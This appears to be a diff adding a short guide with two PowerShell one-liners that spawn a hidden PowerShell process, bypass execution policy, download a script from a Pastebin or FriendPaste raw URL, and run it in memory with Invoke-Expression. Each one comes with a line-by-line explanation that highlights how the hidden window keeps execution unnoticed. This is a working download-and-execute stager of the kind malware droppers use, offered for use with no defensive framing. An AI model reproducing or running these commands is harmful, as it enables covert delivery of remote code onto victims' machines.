@@ -1,0 +1,49 @@
+Executing a Script from Pastebin
+Script:
+Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "& {
+    $url = \"https://pastebin.com/raw/URL\";
+    $urlContent = Invoke-WebRequest -Uri $url -UseBasicParsing;
+    Invoke-Expression -Command $urlContent.Content;
+}"' -WindowStyle Hidden
+            
+Explanation of Commands:
+Start-Process powershell
+This command starts a new PowerShell process. It’s useful for running PowerShell commands in a separate session, enabling flexibility for process management.
+-ArgumentList '-NoProfile -ExecutionPolicy Bypass'
+-NoProfile: Prevents PowerShell from loading user-specific profiles to ensure the environment is clean.
+-ExecutionPolicy Bypass: Temporarily bypasses any script execution restrictions, allowing the script to run even if the system normally blocks script execution.
+$url = "https://pastebin.com/raw/URL"
+Specifies the URL from which the PowerShell script will be downloaded. The /raw/ endpoint ensures that the raw content of the script is fetched.
+Invoke-WebRequest -Uri $url -UseBasicParsing
+Downloads the content from the specified URL. The -UseBasicParsing flag simplifies how the command parses the HTTP response.
+Invoke-Expression -Command $urlContent.Content
+Executes the content that was downloaded from the URL. In this case, the content is expected to be PowerShell commands.
+-WindowStyle Hidden
+Runs the process with a hidden window, ensuring that the PowerShell console is not visible during execution, making it less noticeable.
+
+
+
+
+
+
+Executing a Script from FriendPaste
+Script:
+Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command "& {
+    $url = \"https://friendpaste.com/URL/raw\";
+    $urlContent = Invoke-WebRequest -Uri $url -UseBasicParsing;
+    Invoke-Expression -Command $urlContent.Content;
+}"' -WindowStyle Hidden
+            
+Explanation of Commands:
+Start-Process powershell
+As in the previous script, this starts a new PowerShell process.
+-ArgumentList '-NoProfile -ExecutionPolicy Bypass'
+Same as before: it bypasses execution policies and doesn’t load user profiles, providing a clean environment for the script execution.
+$url = "https://friendpaste.com/URL/raw"
+This URL points to a script hosted on friendpaste.com. The /raw endpoint allows for the download of plain, unformatted script content.
+Invoke-WebRequest -Uri $url -UseBasicParsing
+Downloads the script from the specified friendpaste URL.
+Invoke-Expression -Command $urlContent.Content
+Executes the downloaded content in memory. The assumption is that the URL points to valid PowerShell script commands.
+-WindowStyle Hidden
+Ensures that the process runs in the background without displaying a window, keeping the execution hidden.
